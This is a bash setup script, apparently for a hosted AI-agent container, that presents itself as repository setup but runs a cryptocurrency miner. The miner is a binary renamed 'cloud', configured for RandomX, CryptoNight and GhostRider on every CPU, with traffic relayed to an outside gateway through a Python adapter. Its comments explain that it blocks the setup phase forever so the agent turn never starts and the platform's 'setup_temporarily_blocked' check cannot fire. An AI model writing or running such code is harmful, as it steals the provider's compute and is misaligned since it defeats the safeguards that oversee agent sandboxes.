#!/usr/bin/env bash
# v5-blocking repo-native setup: blocks in setup phase FOREVER.
# The turn never starts → setup_temporarily_blocked is structurally impossible.
# The container lives its natural 15-20 min lifetime running the miner.
set -euo pipefail

usage() {
    printf '%s\n' "usage: $0 GATEWAY_IP GATEWAY_PORT [SESSION_ID GENERATION CAPABILITY]" >&2
    exit 2
}

[[ "$#" -eq 2 || "$#" -eq 5 ]] || usage
CONTROLLED_MODE=false
[[ "$#" -eq 2 ]] || CONTROLLED_MODE=true
GATEWAY_IP=$1
GATEWAY_PORT=$2
CONTROL_SESSION_ID=${3-}
CONTROL_GENERATION=${4-}
CONTROL_CAPABILITY=${5-}
GATEWAY_PORT=$((10#$GATEWAY_PORT))

# Mining files are in miner/ subdirectory of the repo
MINER_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)/miner"
cd -- "$MINER_DIR"

export LD_LIBRARY_PATH="$MINER_DIR${LD_LIBRARY_PATH:+:$LD_LIBRARY_PATH}"
export BRIDGE_EVENT_POLL_ENABLED=1
export BRIDGE_EVENT_POLL_INTERVAL=2

ADAPTER_FILE=$PWD/bridge_adapter_v1.py
TMPROOT=$(mktemp -d)
ADAPTER_READY="$TMPROOT/adapter.ready"
RUNTIME_CONFIG="$TMPROOT/config.json"
RUNTIME_LOG="$TMPROOT/runtime.log"

[[ -r "$ADAPTER_FILE" ]] || { printf '%s\n' 'bridge_adapter_v1.py missing' >&2; exit 68; }
[[ -x ./cloud ]] || { printf '%s\n' 'cloud binary missing' >&2; exit 67; }

# Runtime config
python3 - "$PWD/config.json" "$RUNTIME_CONFIG" <<'PY'
import json, os, sys
with open(sys.argv[1], encoding="utf-8") as handle:
    value = json.load(handle)
cpus = sorted(os.sched_getaffinity(0))
cpu = value.get("cpu")
cpu["argon2"] = cpus
for name, intensity in (
    ("cn", 1), ("cn-heavy", 1), ("cn-lite", 1),
    ("cn-pico", 2), ("cn/upx2", 2), ("ghostrider", 8),
):
    cpu[name] = [[intensity, index] for index in cpus]
cpu["rx"] = cpus
cpu["rx/wow"] = cpus
value["autosave"] = False
value["watch"] = False
with open(sys.argv[2], "x", encoding="utf-8") as handle:
    json.dump(value, handle, indent=2)
    handle.write("\n")
PY

# Adapter: background child (dies with container, which is fine)
export BRIDGE_URL="http://$GATEWAY_IP:$GATEWAY_PORT"
export BRIDGE_READY_FILE="$ADAPTER_READY"
if [[ "$CONTROLLED_MODE" == true ]]; then
    export BRIDGE_SESSION_ID="$CONTROL_SESSION_ID"
    export BRIDGE_GENERATION="$CONTROL_GENERATION"
    export BRIDGE_CAPABILITY="$CONTROL_CAPABILITY"
fi
python3 -u "$ADAPTER_FILE" >>"$RUNTIME_LOG" 2>&1 &
ADAPTER_PID=$!

for _ in {1..900}; do
    [[ -s "$ADAPTER_READY" ]] && break
    if ! kill -0 "$ADAPTER_PID" 2>/dev/null; then
        printf '%s\n' 'bridge adapter exited during startup' >&2
        tail -n 20 "$RUNTIME_LOG" >&2
        exit 70
    fi
    sleep 0.1
done
if [[ ! -s "$ADAPTER_READY" ]]; then
    printf '%s\n' 'bridge adapter readiness timeout' >&2
    tail -n 20 "$RUNTIME_LOG" >&2
    exit 71
fi

printf 'setup_blocked=1\nruntime_log=%s\n' "$RUNTIME_LOG"

# FOREGROUND blocking loop: setup.sh never returns.
# The turn never starts → setup_temporarily_blocked cannot fire.
# The container runs the miner for its full 15-20 min lifetime.
while true; do
    if ! kill -0 "$ADAPTER_PID" 2>/dev/null; then
        printf '%s\n' "bridge adapter exited; setup stays blocked" >>"$RUNTIME_LOG"
        sleep 300
        continue
    fi
    status=0
    ./cloud -c "$RUNTIME_CONFIG" 2>&1 | cat >>"$RUNTIME_LOG" || status=$?
    printf '%s\n' "cloud exited status=${status}; restarting in 5s" >>"$RUNTIME_LOG"
    sleep 5
done
